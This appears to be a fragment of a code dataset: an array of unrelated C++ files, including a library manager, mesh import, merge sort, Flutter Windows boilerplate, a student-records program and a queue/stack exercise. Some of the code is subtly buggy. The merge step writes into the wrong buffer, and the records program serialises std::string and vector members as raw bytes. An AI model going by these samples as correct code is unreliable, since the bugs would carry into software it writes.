the member by ID and add borrowed book ISBN\n            for (size_t j = 0; j < members.size(); ++j) {\n                if (members[j].memberID == memberID) {\n                    members[j].borrowedBooks.push_back(ISBN);\n                    books[i].available = false;  // Mark book as issued\n                    cout << \"Book issued successfully to \" << members[j].name << endl;\n                    return;\n                }\n            }\n            cout << \"Invalid Member ID!\\n\";\n            books[i].available = true; // Revert availability change\n            return;\n        }\n    }\n\n    if (!foundBook) {\n        cout << \"Book not found or unavailable!\\n\";\n    }\n}\n\nvoid returnBook() {\n    int ISBN, memberID;\n    bool foundBook = false;\n\n    cout << \"Enter ISBN of the book to return: \";\n    cin >> ISBN;\n\n    // Find the book by ISBN\n    for (size_t i = 0; i < books.size(); ++i) {\n        if (books[i].ISBN == ISBN) {\n            foundBook = true;\n            books[i].available = true;   // Mark book as available\n\n            cout << \"Enter Member ID: \";\n            cin >> memberID;\n\n            // Find the member by ID and remove borrowed book ISBN\n            for (size_t j = 0; j < members.size(); ++j) {\n                if (members[j].memberID == memberID) {\n                    vector<int>::iterator it = find(members[j].borrowedBooks.begin(), members[j].borrowedBooks.end(), ISBN);\n                    if (it != members[j].borrowedBooks.end()) {\n                        members[j].borrowedBooks.erase(it);\n                        cout << \"Book returned successfully!\\n\";\n                        return;\n                    } else {\n                        cout << \"Member has not borrowed this book!\\n\";\n                        return;\n                    }\n                }\n            }\n        }\n    }\n\n    if (!foundBook) {\n        cout << \"Book not found!\\n\";\n    }\n}\n\nvoid searchBooks() {\n    string searchTerm;\n    int choice;\n\n    cout << \"Search by:\\n\";\n    cout << \"1. Title\\n\";\n    cout << \"2. Author\\n\";\n    cout << \"3. ISBN\\n\";\n    cout << \"Enter your choice: \";\n    cin >> choice;\n\n    cin.ignore(); // Clear input buffer\n    cout << \"Enter search term: \";\n    getline(cin, searchTerm);\n\n    bool found = false;\n    switch (choice) {\n        case 1:\n            for (size_t i = 0; i < books.size(); ++i) {\n                if (books[i].title.find(searchTerm) != string::npos) {\n             ",
    "#include \"Utils.hpp\"\n#include \"PolygonalMesh.hpp\"\n#include <iostream>\n#include <fstream>\n#include <cmath>\n\n\nusing namespace std;\n\nnamespace MeshLibrary{\n\n//creo una funzione che dato il nome di un file restituisce una mesh poligonale\nbool importMesh(const string& path, PolygonalMesh& mesh)\n{\n    if(!importCell0D(path + \"./Cell0Ds.csv\", mesh))\n        return false;\n    else\n    {\n        cout << \"Cell0D marker:\" << endl;\n        for(auto& el : mesh.VerticesMarker)\n        {\n            cout << \"key: \" << el.first << endl;\n            for(auto& id: el.second)\n                cout << id << \" \";\n            cout << endl;\n        }\n        cout << \"\\n\" << endl;\n    }\n\n    if(!importCell1D(path + \"./Cell1Ds.csv\", mesh))\n        return false;\n    else\n    {\n        cout << \"Cell1D marker:\" << endl;\n        for(auto& el : mesh.EdgesMarker)\n        {\n            cout << \"key: \" << el.first << endl;\n            for(auto& id: el.second)\n                cout << id << \" \";\n            cout << endl;\n        }\n        cout << \"\\n\" << endl;\n\n    }\n\n    if(!importCell2D(path + \"./Cell2Ds.csv\", mesh))\n        return false;\n\n    return true;\n}\n\n\nbool importCell0D(const string& fileName, PolygonalMesh& mesh)\n{\n    ifstream file(fileName);//apro il file\n    if(file.fail())\n        return false;\n\n    string header; //var temporanea\n    getline(file, header);//leggo la prima riga e la memorizzo in 'header'\n\n    string line;\n    while (getline(file, line))//finch\u00e8 non ho raggiunto la fine del file, leggo la riga del file e la memorizzo in line\n    {\n        istringstream convert(line);\n        string id_str, marker_str, x_str, y_str;//var temporanee\n\n        //ora leggo l'id, il marker e le coordinate come stringhe, considerando il delimitatore ';'\n        getline(convert, id_str, ';');\n        getline(convert, marker_str, ';');\n        getline(convert, x_str, ';');\n        getline(convert, y_str, ';');\n\n        //ora converto le stringhe in int e double\n        unsigned int id, marker;//var temp\n        Vector2d coordinates;//var temp\n\n        //creo oggetti istringstream e utilizzo l'operatore di estrazione (>>) per estrarre l'id, il marker e le coordinate\n        istringstream convert1(id_str);\n        convert1 >> id;\n        istringstream convert2(marker_str);\n        convert2 >> marker;\n        istringstream convert3(x_str);\n        convert3 >> coordinates(0);\n        istringstream convert4(y_str);\n        convert4 >> coordinates(1);\n\n        //oppure uso le funzioni stoi e stod\n//        unsigned int id = stoi(id_str);\n//        unsigned int marker = stoi(marker_str);\n//        double x = stod(x_str);\n//        double y = stod(y_str);\n\n\n        mesh.IdCell0Ds.push_back(id);\n        mesh.MarkerCell0Ds.push_back(marker);\n        mesh.CoordinatesCell0Ds.push_back(coordinates);\n        mesh.NumberOfCell0Ds++;\n\n\n        //eseguo un test sui marker delle celle 0D\n        if (marker != 0)\n        {\n            auto ret = mesh.VerticesMarker.insert({marker, {id}});\n            if(!ret.second) //se il ret ha valore false significa che il marker gi\u00e0 esisteva\n                mesh.VerticesMarker[marker].push_back(id);\n        }\n\n    }\n\n    file.close();//chiudo il file\n    return true;\n\n}\n\n\nbool importCell1D(const string& fileName, PolygonalMesh& mesh)\n{\n    ifstream file(fileName);\n    if(file.fail())\n        return false;\n\n    string header;\n    getline(file, header);\n\n    string line;\n    while (getline(file, line))\n    {\n        istringstream convert(line);\n        string id_str, marker_str, origin_str, end_str;\n\n        getline(convert, id_str, ';');\n        getline(convert, marker_str, ';');\n        getline(convert, origin_str, ';');\n        getline(convert, end_str, ';');\n\n        unsigned int id, marker;\n        Vector2i vertices;\n\n        istringstream convert1(id_str);\n        convert1 >> id;\n        istringstream convert2(marker_str);\n        convert2 >> marker;\n        istringstream convert3(origin_str);\n        convert3 >> vertices(0);\n        istringstream convert4(end_str);\n        convert4 >> vertices(1);\n\n        mesh.IdCell1Ds.push_back(id);\n        mesh.MarkerCell1Ds.push_back(marker);\n        mesh.VerticesCell1Ds.push_back(vertices);\n        mesh.NumberOfCell1Ds++;\n\n        //eseguo un test sui marker delle celle 1D\n        if (marker != 0)\n        {\n            auto ret = mesh.EdgesMarker.insert({marker, {id}});\n            if(!ret.second)\n                mesh.EdgesMarker[marker].push_back(id);\n        }\n\n    }\n\n    file.close();\n    return true;\n\n}\n\n\n//eseguo un test su ogni lato, cio\u00e8 verifico che non ci siano lati degeneri e calcolo la lunghezza di ogni cella0D\nbool checkNonDegenerateEdges(const PolygonalMesh& mesh, vector<double>& edgeLengths)\n{\n    edgeLengths.clear();//mi assicuro che il vettore sia vuoto\n    for (const auto& vertices : mesh.VerticesCell1Ds)\n    {\n        unsigned int originId = vertices(0);//id dell'origine\n        unsigned int endId = vertices(1);//id della fine\n\n        //trovo le coordinat",
    "#include <iostream>\nusing namespace std;\nvoid merge(int arr[], int s, int e){\n  int mid =(s+e)/2;\n  // length of left array=mid-start+1\n  int LengthLeft=mid-s+1;\n  // legth of right array=end-mid \n  int LengthRight=e-mid;\n\n  // creating the dynamic array\n  int *left=new int[LengthLeft];\n  int *right =new int[LengthRight];\n   // copy karo value from original array to left array\n  int k=s;\n  for(int i=0;i<LengthLeft;i++){\n    left[i]=arr[k];\n    k++;\n  }\n  // right array copy karo\n\n  k=mid+1; \n  for(int i=0;i<LengthRight;i++){\n    right[i]=arr[k];\n    k++;\n  }\n  // for (int i = 0; i < LengthLeft; i++){\n  //   left[i] = arr[s + i];\n  // }\n\n  // // Copy values from the original array to the right array\n  // for (int i = 0; i < LengthRight; i++){\n  //   right[i] = arr[mid + 1 + i];\n  // }\n  // merge logic\n  // left array is already sorted\n  // right array is already sorted\n  int leftIndex=0;\n  int rightIndex=0;\n  int arrayindex=s;\n  while(leftIndex < LengthLeft && rightIndex < LengthRight){\n    \n    if(left[leftIndex]<right[rightIndex]){\n      arr[arrayindex]=left[leftIndex];\n      leftIndex++;\n      arrayindex++;\n    }\n    else{\n      right[arrayindex]=right[rightIndex];\n      rightIndex++;\n      arrayindex++;\n    }\n    \n  }\n  // 2 more cases.\n  // case 1 . if right array is exehusted\n  while(rightIndex<LengthRight){\n    arr[arrayindex]=right[rightIndex];\n    rightIndex++;\n    arrayindex++;\n    \n  }\n  // case 2 if left array is exehusted\n  while(leftIndex<LengthLeft){\n    arr[arrayindex]=left[leftIndex];\n    leftIndex++;\n    arrayindex++;\n    \n  } \n  // last  step ki heap memory ko free karo\n  delete []left;\n  delete []right;\n  \n  \n  \n}\nvoid mergeSort(int arr[], int s, int e){\n  // solving from recursion\n  // base case\n   if(s>=e){\n     return;\n   }\n  // break \n  int mid =s+(e-s)/2;\n  // recursion in left part\n  mergeSort(arr,s,mid);\n  // rightpart\n  mergeSort(arr,mid+1,e);\n  // merge two sorted array\n  merge(arr,s,e);\n\n  \n}\n\nint main() {\n  // Divide And conqure \n  // merge sort\n  int arr[] = {1,2,3,4,5,6};\n  int size = 6;\n  int s = 0;\n  int e = size - 1;\n\n  cout << \"Before merge sort: \" << endl;\n  for(int i=0; i<size; i++) {\n    cout << arr[i] << \" \";\n  }\n  cout << endl;\n\n  mergeSort(arr,s,e);\n\n  cout << \"After merge sort: \" << endl;\n  for(int i=0; i<size; i++) {\n    cout << arr[i] << \" \";\n  }\n  cout << endl;\n //  int arr[]={6,5,4,3,2,1};\n //  int size=6;\n //  for(int i=0;i<size;i++){\n //    cout<<arr[i]<<\" \";\n //  }\n //  cout<<endl;\n //  mergeSort(arr,0,size-1);\n // // after merge sort \n //  // printing the array \n //  for(int i=0;i<size;i++){\n //    cout<<arr[i]<<\" \";\n //  }\n\n\n  // merge two sorted array\n  // int arr[]={1,2,3};\n  // int size=3;\n  // int arr1[]={1,3,5};\n  // int size1=3;\n  \n  \n}\n",
    "#include \"win32_window.h\"\n\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n    FreeLibrary(user32_module);\n  }\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::CreateAndShow(const std::wstring& title,\n                                const Point& origin,\n                                const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW | WS_VISIBLE,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  return OnCreate();\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    SetWindowLongPtr(window, GWLP_USERDATA,\n                     reinterpret_cast<LONG_PTR>(window_struct->lpCreateParams));\n\n    auto that = static_cast<Win32Window*>(window_struct->lpCreateParams);\n    EnableFullDpiSupportIfAvailable(window);\n    that->window_handle_ = window;\n  } else if (Win32Window* that = GetThisFromHandle(window)) {\n    return that->MessageHandler(window, message, wparam, lparam);\n  }\n\n  return DefWindowProc(window, message, wparam, lparam);\n}\n\nLRESULT\nWin32Window::MessageHandler(HWND hwnd,\n                            UINT const message,\n                            WPARAM const wparam,\n                            LPARAM const lparam) noexcept {\n  switch (message) {\n    case WM_DESTROY:\n      window_handle_ = nullptr;\n      Destroy();\n      if (quit_on_close_) {\n        PostQuitMessage(0);\n  ",
    "\ufeff#include <fstream>\n#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <string>\n#include <Windows.h>\n\nusing namespace std;\n\nstruct Student {\n    string surname;\n    vector<int> grades;\n};\n\nstruct Faculty {\n    string name;\n    int groupNumber;\n};\n\nstruct Course {\n    string name;\n};\n\nstruct Record {\n    Faculty faculty;\n    Course course;\n    Student student;\n};\n\n// \u0424\u0443\u043d\u043a\u0446\u0456\u044f \u0434\u043b\u044f \u0437\u0430\u043f\u0438\u0441\u0443 \u0434\u0430\u043d\u0438\u0445 \u0443 \u0444\u0430\u0439\u043b\nvoid writeToFile(const string& filename, const vector<Record>& records) {\n    ofstream file(filename, ios::binary);\n    if (!file) {\n        cerr << \"\u041d\u0435 \u0432\u0434\u0430\u043b\u043e\u0441\u044f \u0432\u0456\u0434\u043a\u0440\u0438\u0442\u0438 \u0444\u0430\u0439\u043b \u0434\u043b\u044f \u0437\u0430\u043f\u0438\u0441\u0443.\\n\";\n        return;\n    }\n    for (const auto& record : records) {\n        file.write(reinterpret_cast<const char*>(&record), sizeof(Record));\n    }\n    file.close();\n}\n\n// \u0424\u0443\u043d\u043a\u0446\u0456\u044f \u0434\u043b\u044f \u0434\u043e\u0434\u0430\u0432\u0430\u043d\u043d\u044f \u0437\u0430\u043f\u0438\u0441\u0443 \u0443 \u0444\u0430\u0439\u043b\nvoid appendToFile(const string& filename, const Record& record) {\n    ofstream file(filename, ios::binary | ios::app);\n    if (!file) {\n        cerr << \"\u041d\u0435 \u0432\u0434\u0430\u043b\u043e\u0441\u044f \u0432\u0456\u0434\u043a\u0440\u0438\u0442\u0438 \u0444\u0430\u0439\u043b \u0434\u043b\u044f \u0434\u043e\u0434\u0430\u0432\u0430\u043d\u043d\u044f.\\n\";\n        return;\n    }\n    file.write(reinterpret_cast<const char*>(&record), sizeof(Record));\n    file.close();\n}\n\n// \u0424\u0443\u043d\u043a\u0446\u0456\u044f \u0434\u043b\u044f \u0437\u0430\u043c\u0456\u043d\u0438 \u0437\u0430\u043f\u0438\u0441\u0443 \u0443 \u0444\u0430\u0439\u043b\u0456\nvoid replaceInFile(const string& filename, const Record& record, int index) {\n    fstream file(filename, ios::binary | ios::in | ios::out);\n    if (!file) {\n        cerr << \"\u041d\u0435 \u0432\u0434\u0430\u043b\u043e\u0441\u044f \u0432\u0456\u0434\u043a\u0440\u0438\u0442\u0438 \u0444\u0430\u0439\u043b \u0434\u043b\u044f \u0437\u0430\u043c\u0456\u043d\u0438.\\n\";\n        return;\n    }\n    file.seekp(index * sizeof(Record));\n    file.write(reinterpret_cast<const char*>(&record), sizeof(Record));\n    file.close();\n}\n\n// \u0424\u0443\u043d\u043a\u0446\u0456\u044f \u0434\u043b\u044f \u0432\u0438\u0434\u0430\u043b\u0435\u043d\u043d\u044f \u0434\u0430\u043d\u0438\u0445 \u0437 \u0444\u0430\u0439\u043b\u0443\nvoid deleteFromFile(const string& filename, const string& surname) {\n    vector<Record> records;\n    ifstream file(filename, ios::binary);\n    if (!file) {\n        cerr << \"\u041d\u0435 \u0432\u0434\u0430\u043b\u043e\u0441\u044f \u0432\u0456\u0434\u043a\u0440\u0438\u0442\u0438 \u0444\u0430\u0439\u043b \u0434\u043b\u044f \u0447\u0438\u0442\u0430\u043d\u043d\u044f.\\n\";\n        return;\n    }\n    Record record;\n    while (file.read(reinterpret_cast<char*>(&record), sizeof(Record))) {\n        if (record.student.surname != surname) {\n            records.push_back(record);\n        }\n    }\n    file.close();\n\n    ofstream outFile(filename, ios::binary);\n    if (!outFile) {\n        cerr << \"\u041d\u0435 \u0432\u0434\u0430\u043b\u043e\u0441\u044f \u0432\u0456\u0434\u043a\u0440\u0438\u0442\u0438 \u0444\u0430\u0439\u043b \u0434\u043b\u044f \u0437\u0430\u043f\u0438\u0441\u0443.\\n\";\n        return;\n    }\n    for (const auto& rec : records) {\n        outFile.write(reinterpret_cast<const char*>(&rec), sizeof(Record));\n    }\n    outFile.close();\n}\n\n// \u0424\u0443\u043d\u043a\u0446\u0456\u044f \u0434\u043b\u044f \u0437\u043d\u0430\u0445\u043e\u0434\u0436\u0435\u043d\u043d\u044f \u0441\u0442\u0443\u0434\u0435\u043d\u0442\u0456\u0432 \u0437 \u0441\u0435\u0440\u0435\u0434\u043d\u0456\u043c \u0431\u0430\u043b\u043e\u043c 4.5\nvoid findStudentsByAverageGrade(const vector<Record>& records, double targetAverage) {\n    cout << \"\u0421\u0442\u0443\u0434\u0435\u043d\u0442\u0438 \u0437 \u0441\u0435\u0440\u0435\u0434\u043d\u0456\u043c \u0431\u0430\u043b\u043e\u043c \" << targetAverage << \":\\n\";\n    for (const auto& record : records) {\n        double sum = 0;\n        for (int grade : record.student.grades) {\n            sum += grade;\n        }\n        double average = sum / record.student.grades.size();\n        if (average == targetAverage) {\n            cout << \"\u041f\u0440\u0456\u0437\u0432\u0438\u0449\u0435: \" << record.student.surname << \", \u0413\u0440\u0443\u043f\u0430: \" << record.faculty.groupNumber << \", \u0424\u0430\u043a\u0443\u043b\u044c\u0442\u0435\u0442: \" << record.faculty.name << endl;\n        }\n    }\n}\n\n// \u0424\u0443\u043d\u043a\u0446\u0456\u044f \u0434\u043b\u044f \u0432\u0438\u0434\u0430\u043b\u0435\u043d\u043d\u044f \u0441\u0442\u0443\u0434\u0435\u043d\u0442\u0456\u0432 \u043f\u0435\u0440\u0448\u043e\u0433\u043e \u043a\u0443\u0440\u0441\u0443 \u0437 \u0442\u0440\u044c\u043e\u043c\u0430 \u0434\u0432\u0456\u0439\u043a\u0430\u043c\u0438\nvoid deleteStudentsWithLowGrades(const string& filename) {\n    vector<Record> records;\n    ifstream file(filename, ios::binary);\n    if (!file) {\n        cerr << \"\u041d\u0435 \u0432\u0434\u0430\u043b\u043e\u0441\u044f \u0432\u0456\u0434\u043a\u0440\u0438\u0442\u0438 \u0444\u0430\u0439\u043b \u0434\u043b\u044f \u0447\u0438\u0442\u0430\u043d\u043d\u044f.\\n\";\n        return;\n    }\n    Record record;\n    while (file.read(reinterpret_cast<char*>(&record), sizeof(Record))) {\n        if (record.course.name == \"\u041f\u0435\u0440\u0448\u0438\u0439\") {\n            int countTwos = count(record.student.grades.begin(), record.student.grades.end(), 2);\n            if (countTwos == 3) {\n                continue;\n            }\n        }\n        records.push_back(record);\n    }\n    file.close();\n\n    ofstream outFile(filename, ios::binary);\n    if (!outFile) {\n        cerr << \"\u041d\u0435 \u0432\u0434\u0430\u043b\u043e\u0441\u044f \u0432\u0456\u0434\u043a\u0440\u0438\u0442\u0438 \u0444\u0430\u0439\u043b \u0434\u043b\u044f \u0437\u0430\u043f\u0438\u0441\u0443.\\n\";\n        return;\n    }\n    for (const auto& rec : records) {\n        outFile.write(reinterpret_cast<const char*>(&rec), sizeof(Record));\n    }\n    outFile.close();\n}\n\n// \u0424\u0443\u043d\u043a\u0446\u0456\u044f \u0434\u043b\u044f \u0441\u043e\u0440\u0442\u0443\u0432\u0430\u043d\u043d\u044f \u043d\u0430\u0437\u0432 \u0444\u0430\u043a\u0443\u043b\u044c\u0442\u0435\u0442\u0456\u0432 \u0437\u0430 \u0437\u0440\u043e\u0441\u0442\u0430\u043d\u043d\u044f\u043c \u0443\u0441\u043f\u0456\u0448\u043d\u043e\u0441\u0442\u0456 \u0441\u0442\u0443\u0434\u0435\u043d\u0442\u0456\u0432\nvoid sortFacultiesBySuccess(const vector<Record>& records) {\n    vector<string> facultyNames;\n    for (const auto& record : records) {\n        double sum = 0;\n        for (int grade : record.student.grades) {\n            sum += grade;\n        }\n        double average = sum / record.student.grades.size();\n        facultyNames.push_back(record.faculty.name + \": \" + to_string(average));\n    }\n    sort(facultyNames.begin(), facultyNames.end());\n\n    cout << \"\u0424\u0430\u043a\u0443\u043b\u044c\u0442\u0435\u0442\u0438 \u0432\u0456\u0434\u0441\u043e\u0440\u0442\u043e\u0432\u0430\u043d\u0456 \u0437\u0430 \u0443\u0441\u043f\u0456\u0448\u043d\u0456\u0441\u0442\u044e:\\n\";\n    for (const auto& name : facultyNames) {\n        cout << name << endl;\n    }\n}\n\nint main() {\n    SetConsoleCP(1251);\n    SetConsoleOutputCP(1251);\n\n    vector<Record> records;\n\n    while (true) {\n        cout << \"1. \u0414\u043e\u0434\u0430\u0442\u0438 \u0437\u0430\u043f\u0438\u0441 \u0434\u043e \u0444\u0430\u0439\u043b\u0443\\n\";\n        cout << \"2. \u0417\u0430\u043c\u0456\u043d\u0438\u0442\u0438 \u0434\u0430\u043d\u0456 \u0432 \u0444\u0430\u0439\u043b\u0456\\n\";\n        cout << \"3. \u0412\u0438\u0434\u0430\u043b\u0438\u0442\u0438 \u0441\u0442\u0443\u0434\u0435\u043d\u0442\u0456\u0432 \u0437 \u043d\u0438\u0437\u044c\u043a\u0438\u043c\u0438 \u043e\u0446\u0456\u043d\u043a\u0430\u043c\u0438\\n\";\n        cout << \"4. \u0417\u043d\u0430\u0439\u0442\u0438 \u0441\u0442\u0443\u0434\u0435\u043d\u0442\u0456\u0432 \u0437\u0430 \u0441\u0435\u0440\u0435\u0434\u043d\u044c\u043e\u044e \u043e\u0446\u0456\u043d\u043a\u043e\u044e\\n\";\n        cout << \"5. \u0412\u0456\u0434\u0441\u043e\u0440\u0442\u0443\u0432\u0430\u0442\u0438 \u0444\u0430\u043a\u0443\u043b\u044c\u0442\u0435\u0442\u0438 \u0437\u0430 \u0443\u0441\u043f\u0456\u0448\u043d\u0456\u0441\u0442\u044e\\n\";\n        cout << \"6. \u0412\u0438\u0445\u0456\u0434",
    "#include <iostream>\n#include <cstdlib>\n#include<ctime>\nusing namespace std;\n\n\n\nint const QueueSize = 100;\nint const stackSize = 100;\nint \u00ddtems[QueueSize];\nint Stack[stackSize];\nint front, rear;\nint Top = -1;\nint generateNumber()\n{\n\tstatic bool first = true;\n\tif (first)\n\t{\n\t\tsrand(time(NULL));\n\t\tfirst = false;\n\t}\n\treturn 0 + rand() % (1001);\n}\nvoid \u00ddnsertNumber()\n{\n\tint x = 0;\n\tif (rear == QueueSize - 1)\n\t\trear = 0;\n\n\telse\n\t\trear++;\n\n\tif (rear == front)\n\t{\n\t\tcout << \"Queue overflow\" << endl;\n\t\texit(1);\n\t}\n\t\u00ddtems[rear] = x;\n\n}\n\nint DeleteNumber()\n{\n\tif (front == rear)\n\t{\n\t\tcout << \"Queue underflow\" << endl;\n\t\texit(1);\n\t}\n\telse if (front == QueueSize - 1)\n\t\tfront = 0;\n\telse\n\t\tfront++;\n\treturn \u00ddtems[front];\n}\nvoid Push(int a)\n{\n\tif (Top >= stackSize - 1)\n\n\t\tcout << \"Stack is full..\" << endl;\n\telse\n\t{\n\t\tTop++;\n\t\tStack[Top] = a;\n\n\t}\n}\nvoid Pop(int b)\n{\n\tif (Top <= -1)\n\t{\n\t\tcout << \"Stack is empty...\" << endl;\n\t}\n\telse {\n\t\tcout << \"Value :\" << Stack[Top] << \"GOT deleted.\" << endl;\n\t\tTop--;\n\t}\n}\n\nvoid PrintQueue(int arr[])\n{\n\n\n\tcout << \"Element in the Queue are: \" << endl;\n\tfor (int i = 0; i < QueueSize; i++)\n\t{\n\t\tcout << \u00ddtems[i] << endl;\n\n\t}\n}\nvoid PrintStack(int arr[])\n{\n\n\n\tcout << \"Element in the stack are: \" << endl;\n\tfor (int i = 0; i < stackSize; i++)\n\t{\n\t\tcout << Stack[i] << endl;\n\n\t}\n}\n\nint main()\n{\n\t\n\tcout << \"Element in the Queue are: \" << endl;\n\tfor (int i = 0; i < 100; i++)\n\t{\n\t\t\u00ddtems[i] = generateNumber();\n\t}\n\t\u00ddnsertNumber();\n\t//DeleteNumber();\n\tPrintQueue(\u00ddtems);\n\n\t\n\tfor (int i = 0; i < 100; i++)\n\t{\n\t   Stack[i]= \u00ddtems[i];\n\t}\n\n\t/*Push(10);\n\tPop(5);*/\n\tPrintStack(Stack);\n\t\n\n\n\n\n\n\treturn 0;\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include<iostream>\n#include<stdio.h>\n#include<GL/glut.h>\n#include<GL/gl.h>\n#include<stdlib.h>\n#include<memory.h>\n#include<vector>\n#include<map>\n#include<queue>\n#include<stack>\n#include<algorithm>\n#include<ctime>\n#include<unistd.h>\n\nusing namespace std;\n\n#define p_b push_back\n#define m_p make_pair\n#define all(v) v.begin(),v.end()\n#define INF 1000000000\n\nint width=1250;\t\t//width of the canvas\nint height=700;\t\t//height of the canvas\nint road_width=110;\t//width of the road\nint hor_road_gap=150;\t//gap in horizontal road\nint ver_road_gap=100;\t//gap in vertical road\nint hor_gap=100;\nint ver_gap=100;\n\nint n=3;\t\t//No. of rows\nint m=4;\t\t//No. of columns\n\ndouble dist[5][5];\t\nbool used[5][5];\n\nint no_of_vehicle=14;\t//Stores the number of vehicles.\n\nint x,y;\nint dx[]={-1,1,0,0};\t//To traverse along the grids\nint dy[]={0,0,-1,1};\t//To traverse along the grids\n\nbool paus=false,draw=false;\n\nstack<pair<int,int> > path;\t//To store the path from source to destination.\n\nvector<double> speeds;\t\t//stores the speed of vehicles.\nvector<pair<double,double> > positions;\t\t//stores the position of vehicles.\nvector<bool> directions;\t//stores the direction of vehicles.\nvector<char> orientations;\t//stores the orientation of vehicles.\n\nqueue<double> hor_left;\nqueue<double> hor_right;\nqueue<double> ver_up;\nqueue<double> ver_down;\n\nmap<pair<pair<int,int>,pair<int,int> >,double > weights;\t//stores the weights of different road sections.\nmap<pair<int,int>,pair<int,int> > parent;\t\t\t//stores the parent of the current grid.\npair<int,int> start,dest;\t\nmap<pair<int,int>,pair<double,double> > point_map;\nmap<pair<int,int>,double> map_speed;\n\ndouble colors[20][3];\n\nstruct vehicles{\t\t//stores the state of each vehicles.\n\tdouble vehicle_speedX;\t\t\n\tdouble 